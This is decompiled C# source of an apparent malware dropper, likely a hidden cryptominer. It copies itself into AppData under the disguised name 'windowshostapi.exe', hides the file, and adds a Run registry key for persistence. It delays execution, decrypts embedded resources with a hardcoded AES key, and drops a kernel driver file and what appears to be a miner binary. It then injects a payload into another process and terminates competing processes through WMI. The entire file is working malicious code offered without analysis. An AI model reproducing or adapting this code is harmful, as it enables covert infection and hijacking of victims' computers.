using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

public class Program
{
	public static bool IH = true;

	[STAThread]
	public static void Main()
	{
		Install();
		KillLastProc();
		Initialize();
	}

	public static void Install()
	{
		Thread.Sleep(2000);
		try
		{
			if (Operators.CompareString(Process.GetCurrentProcess().MainModule!.FileName, Path.Combine(Interaction.Environ("AppData"), "windowshostapi.exe"), false) == 0)
			{
				return;
			}
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (Operators.CompareString(process.MainModule!.FileName, Path.Combine(Interaction.Environ("AppData"), "windowshostapi.exe"), false) == 0)
					{
						process.Kill();
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			using (FileStream fileStream = new FileStream(Path.Combine(Interaction.Environ("AppData"), "windowshostapi.exe"), FileMode.Create))
			{
				byte[] array = File.ReadAllBytes(Process.GetCurrentProcess().MainModule!.FileName);
				fileStream.Write(array, 0, array.Length);
			}
			if (IH)
			{
				try
				{
					File.SetAttributes(Path.Combine(Interaction.Environ("AppData"), "windowshostapi.exe"), FileAttributes.Hidden | FileAttributes.System);
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
			Thread.Sleep(2000);
			Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\").SetValue(Path.GetFileName(Path.Combine(Interaction.Environ("AppData"), "windowshostapi.exe")), Path.Combine(Interaction.Environ("AppData"), "windowshostapi.exe"));
			Process.Start(Path.Combine(Interaction.Environ("AppData"), "windowshostapi.exe"));
			Environment.Exit(0);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	public static byte[] GetTheResource(string Get_)
	{
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		ResourceManager resourceManager = new ResourceManager("yvninold", executingAssembly);
		return AES_Decryptor((byte[])resourceManager.GetObject(Get_));
	}

	public static object GetString(string input)
	{
		return Encoding.ASCII.GetString(AES_Decryptor(Convert.FromBase64String(input)));
	}

	public static void Run(byte[] PL, string arg, byte[] buffer)
	{
		try
		{
			Assembly.Load(PL).GetType("Project1.Program")!.GetMethod("Load", BindingFlags.Static | BindingFlags.Public)!.Invoke(null, new object[3]
			{
				buffer,
				Operators.ConcatenateObject(Operators.ConcatenateObject(GetString("XYj3USIJin30TNZBeTkLyg=="), (object)"\\"), GetString("7EEgPq1K7QG9Z+tJH/hZkg==")),
				arg
			});
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void KillLastProc()
	{
		//IL_007e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		object objectValue = default(object);
		object objectValue2 = default(object);
		IEnumerable enumerable = default(IEnumerable);
		string text = default(string);
		ManagementObjectSearcher val = default(ManagementObjectSearcher);
		IEnumerator enumerator = default(IEnumerator);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 344:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_002b;
						case 4:
							goto IL_005b;
						case 5:
							goto IL_0079;
						case 6:
							goto IL_0084;
						case 7:
							goto IL_008e;
						case 8:
							goto IL_00b0;
						case 9:
							goto IL_00da;
						case 10:
						case 11:
							goto IL_00f6;
						default:
							goto end_IL_0000;
						case 12:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_00da:
					num = 9;
					NewLateBinding.LateCall(objectValue, (Type)null, "Terminate", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					goto IL_00f6;
					IL_0008:
					num = 2;
					objectValue2 = RuntimeHelpers.GetObjectValue(Interaction.GetObject("winmgmts: {impersonationLevel=impersonate}!\\\\" + Environment.UserDomainName + "\\root\\cimv2", (string)null));
					goto IL_002b;
					IL_002b:
					num = 3;
					enumerable = (IEnumerable)RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue2, (Type)null, "ExecQuery", new object[1] { "Select * from Win32_Process" }, (string[])null, (Type[])null, (bool[])null));
					goto IL_005b;
					IL_005b:
					num = 4;
					text = string.Format("select CommandLine from Win32_Process where Name='{0}'", RuntimeHelpers.GetObjectValue(GetString("7EEgPq1K7QG9Z+tJH/hZkg==")));
					goto IL_0079;
					IL_0079:
					num = 5;
					val = new ManagementObjectSearcher(text);
					goto IL_0084;
					IL_0084:
					num = 6;
					val.Get();
					goto IL_008e;
					IL_008e:
					num = 7;
					enumerator = enumerable.GetEnumerator();
					goto IL_0099;
					IL_0099:
					if (enumerator.MoveNext())
					{
						objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
						goto IL_00b0;
					}
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
					goto end_IL_0000_2;
					IL_00f6:
					num = 11;
					goto IL_0099;
					IL_00b0:
					num = 8;
					if (NewLateBinding.LateGet(objectValue, (Type)null, "CommandLine", new object[0], (string[])null, (Type[])null, (bool[])null).ToString()!.Contains("--don"))
					{
						goto IL_00da;
					}
					goto IL_00f6;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 344;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void Initialize()
	{
		if (Versioned.IsNumeric((object)"45") && Conversions.ToInteger("45") > 0)
		{
			Thread.Sleep(checked(Conversions.ToInteger("45") * 1000));
		}
		try
		{
			byte[] theResource = GetTheResource("cufnpk");
			byte[] buffer = new byte[0];
			byte[] theResource2 = GetTheResource("vwrjk");
			string text = Conversions.ToString(GetString("Ug+TIaIS614QmA5DWGAvfQ=="));
			string text2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text;
			string text3 = "";
			try
			{
				Directory.CreateDirectory(text2);
				DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text.Split(new char[1] { '\\' })[0]);
				try
				{
					directoryInfo.Attributes = FileAttributes.Hidden | FileAttributes.System;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(text2 + "WR64.sys", theResource2, false);
				using ZipArchive zipArchive = new ZipArchive(new MemoryStream(theResource));
				foreach (ZipArchiveEntry entry in zipArchive.Entries)
				{
					if (!entry.FullName.Contains("xm"))
					{
						continue;
					}
					using Stream stream = entry.Open();
					object obj = new MemoryStream();
					try
					{
						stream.CopyTo((Stream)obj);
						buffer = (byte[])NewLateBinding.LateGet(obj, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null);
					}
					finally
					{
						if (obj != null)
						{
							((IDisposable)obj).Dispose();
						}
					}
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			Run(GetTheResource("tdhyvhmkg"), Conversions.ToString(Operators.AddObject(GetString("rV9VJPxBnz9IuIFfG0BJCZ6fge5t8VP4oM84RjqC8vjAjMTDjKMUKM241VDqQ3M5+dcXjLJEQJc/4uRxupnVLiFPOSa9BnHcq7eFxL0QZxKR4S4ui5g7nuNTeinjVIYFy8EU5FmN/BwekphstTSOrXAPEFrlt2IV3O/RwxyBTW+9eUwz8tNn8ywpVAYwpl6rkZm3JU8cfdWoVe729uw6vggJ4lwoyBBt15CpZVAqLdNY+4YrJwbn5ZqmddIQASAlmpQ1RDhWMrw/qxQRMBtK6rXS8UVPdxGLn2EE5YSYRhZP3Lof1gpEb5Cuq9iruT+eok9pTe6eGkER5rhSiJkV/O6C7CG+Tu6jVaNAUxcpFbjuShpX/iFWs3pmr0L6o8feD/W53bwh/WvoPLpZBnA2ERC6vmQd5ywfsbv/ahxLq5B3z7oiUE+Tb6rl8M7AX9zkB8mdulldmz8vBcL1upPSKdlQ9Fa/jSYJwby3QfVFnRY7lhCtaIyeqeu/2VT0q0K6"), (object)text3)), buffer);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	public static byte[] AES_Decryptor(byte[] input)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] result = default(byte[]);
		try
		{
			byte[] array = new byte[32];
			byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes("xxoxzc"));
			Array.Copy(sourceArray, 0, array, 0, 16);
			Array.Copy(sourceArray, 0, array, 15, 16);
			rijndaelManaged.Key = array;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			result = cryptoTransform.TransformFinalBlock(input, 0, input.Length);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
